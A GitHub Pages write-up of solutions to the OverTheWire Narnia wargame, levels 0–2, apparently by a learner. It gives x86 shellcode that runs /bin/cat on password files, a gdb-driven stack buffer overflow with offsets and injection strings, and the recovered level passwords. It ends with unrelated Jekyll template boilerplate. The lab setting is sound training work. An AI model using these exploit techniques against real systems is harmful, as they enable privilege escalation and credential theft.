## Narnia Solutions

Here are short solutions I have written for Narnia levels. This is a wargame in overthewire.org. The main subject of the game is exploitation. I wrote only where I felt that there were not many sufficient solutions to the level.

### Narnia0

Well, I think that there are plany well written solutions for this level. I would like to mention, however, that the shellcode should be generated inside the shell (use python or ruby or perl, etc') because for some unusual reason, pasting a prepeared shellcode inside the shell **will not work**.


### Narnia1

To solve this level, we need to know assembly, x86 in this case (typing "lscpu" will reveal us the architecture and byte order, which are **important** for out shellcode). There are planty writeup's for this level, which most of them are incorrect (but I do recommand reading them in order to understand what is wrong), however. Moreover, I would advise you to learn how to write a shellcode in linux, because copying and pasting a shellcode from shell storm won't work in this case. So after we figure out that there is a buffer overflow with the enviromental variable, we want to inject our shellcode. Remeber, no null bytes and illegal chars!
Because spawning a regular shell won't work (the shell will be privileged with narnia1 user), we want to use the our vulnerability to open narnia2 password file. Let's dive into our shell code:
```
section .text
	global _start

_start:
	xor eax,eax
	push eax          ;end of the /bin/cat string
	push 0x7461632f
	push 0x6e69622f
	mov ebx, esp      ;ebx points to the start of the string
	push eax
	push 0x3261696e
	push 0x72616e2f
	push 0x73736170
	push 0x5f61696e
	push 0x72616e2f
	push 0x6374652f
	mov ecx, esp      ;ecx points to the start of the string (/etc/narnia_pass/narnia2)
  push eax          ;array has to end with null
	mov al, 11        ;we use execve syscall, numbered 11
	mov edx, esp      ;edx points to null (we don't need char *const envp[])
	push ecx          ;push the first arg (/etc/narnia_pass/narnia2)
	push ebx          ;push the second arg (/bin/cat
	mov ecx, esp      ;ecx points to array with two args
	int 0x80
```	
	
Now, we want to compile our code and link it, thus:
```nasm -f elf shell.asm -o shell.o
ld -m elf_i386 -s shell.o -o shell
```
(-m elf_i386 is not necessary, but was in my case)

Okay, let's extract our shellcode:
`for i in $(objdump -M intel -d shell | grep "^ "|cut -f2); do echo -n '\x'$i;done;echo`
and Wallah:
```
narnia1@narnia:~$ export EGG=`python -c "print('\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80')"`
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
nairiepecu
```

### Narnia2

Here, we are dealing with a classic buffer overflow once again. We can see that our buffer is limited, hence we can give a bigger input that exceeds our buffer size  (no input validation is done) and thus overwrite our return address from the main() function. This will allow us to jump into a place we control and execute our shellcode. I truly recommand reading phracks 'smashing the stack' article to gain better understanding of this attack: http://phrack.org/issues/49/14.html

Let's proceed to our soltuion:
First, we fire up gdb and give it an input which is bigger than expected and see what happens with our stack:
```
disas main
(we break on the address of ret, because we want to overwrite the return address)
b *0x080484b2(ret's_address, which is obviously different for everyone)
r $(python -c "print('a'*130)")
```
now let's check if our $ebp was or $esp were overwritten:
``` info reg ```
No, not yet. After trying for several times, input of 144*'a' will overwrite esp and eip (eip contains the return address).
Now, we want to overwrite the last 4 bytes with 'our' address (our controlled address). We will add our shellcode from the previous level and will change it slighlty (will read narnia3 file instead of narnia2). It's size is 59 bytes. Now, we want our controlled address be the address in the stack in which the injected shellcode starts. Therefore we will inject our shellcode and see where it starts, letting us to overwrite the eip address to point to the start of it:
```
r $(python -c "print('a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'aaaa')")
```
```
x/200wx $esp
0xffffd780:	0x616e2f61	0x61696e72	0x61610032	0x61616161
0xffffd790:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7a0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7b0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7c0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd7d0:	0x61616161	0x61616161	0x31616161	0x2f6850c0
0xffffd7e0:	0x68746163	0x6e69622f	0x6850e389	0x3361696e
0xffffd7f0:	0x616e2f68	0x61706872	0x6e687373	0x685f6169
0xffffd800:	0x72616e2f	0x74652f68	0x50e18963	0xe2890bb0
0xffffd810:	0xe1895351	0x616180cd	0x58006161	0x535f4744
```
We can see that our shellcode starts at: 0xffffd7d0+B(11 in decimal)=0xffffd7db. Additionaly, we can see that eip is overwritten by our 4 extra bytes:
```
(gdb) info frame
Stack level 0, frame at 0xffffd5b4:
 eip = 0x61616161; saved eip = 0x0
 called by frame at 0xffffd5b8
 Arglist at 0xffffd5ac, args: 
 Locals at 0xffffd5ac, Previous frame's sp is 0xffffd5b4
 Saved registers:
  eip at 0xffffd5b0
```
Okay, now we know our injection code should be the following:
```
'a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff'
```
Let's get the password:
./narnia2 ``python -c "print('a'*81+'\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x6e\x69\x61\x33\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x50\xb0\x0b\x89\xe2\x51\x53\x89\xe1\xcd\x80'+'\xdb\xd7\xff\xff')"``
and...........wallah:
vaequeezee





- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/int3rsys/Narnia-solutions/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
